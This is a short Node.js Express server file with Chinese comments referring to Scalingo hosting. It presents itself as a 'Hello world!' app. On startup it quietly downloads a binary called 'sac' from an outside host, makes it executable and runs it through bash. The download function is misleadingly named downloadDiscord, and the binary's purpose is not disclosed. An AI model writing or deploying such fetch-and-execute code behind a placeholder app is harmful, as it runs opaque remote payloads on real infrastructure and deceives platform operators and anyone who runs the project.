const express = require("express");
const app = express();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
// const FILE_PATH = './.npm'; // <--- 不再需要这个常量

app.get("/", function(req, res) {
  res.send("Hello world!");
});

// **已删除 /log 路由**
// 因为读取本地文件在云环境中会导致数据丢失和错误。
// Scalingo 平台会直接收集 console.log 的输出作为您的应用日志。

const downloadDiscord = async () => {
  try {
    // 使用 console.log 替代之前的注释，确保下载开始信息被 Scalingo 收集
    console.log('Start downloading sac...');
    const response = await axios({
      method: 'get',
      url: 'https://amd64.2go.us.kg/sac',
      responseType: 'stream'
    });

    const writer = fs.createWriteStream('sac');
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        // 使用 console.log 记录重要事件
        console.log('Download completed and file saved.'); 
        exec('chmod +x sac', (err) => {
          if (err) {
            console.error('Error changing file permissions:', err); // 使用 console.error 记录错误
            reject(err);
          }
          resolve();
        });
      });
      writer.on('error', reject);
    });
  } catch (err) {
    // 捕获和记录下载错误
    console.error('Error during downloadDiscord process:', err.message);
    throw err;
  }
};

const Execute = async () => {
  try {
    await downloadDiscord();
    const command = './sac';
    console.log(`Executing command: ${command}`); // 记录执行命令的事件
    exec(command, { 
      shell: '/bin/bash'
    }, (err, stdout, stderr) => {
        if (err) {
            console.error(`Execution error: ${err.message}`); // 记录执行错误
            return;
        }
        if (stdout) console.log(`Execution stdout: ${stdout}`); // 记录标准输出
        if (stderr) console.error(`Execution stderr: ${stderr}`); // 记录标准错误
    });
  } catch (err) {
    // 捕获和记录 Execute 流程中的任何错误
    console.error('Error in Execute function:', err.message);
  }
};

Execute();

app.listen(PORT, () => {
  // 这条消息会被 Scalingo 平台自动捕获并作为日志显示
  console.log(`Server is running on port:${PORT}`);
});
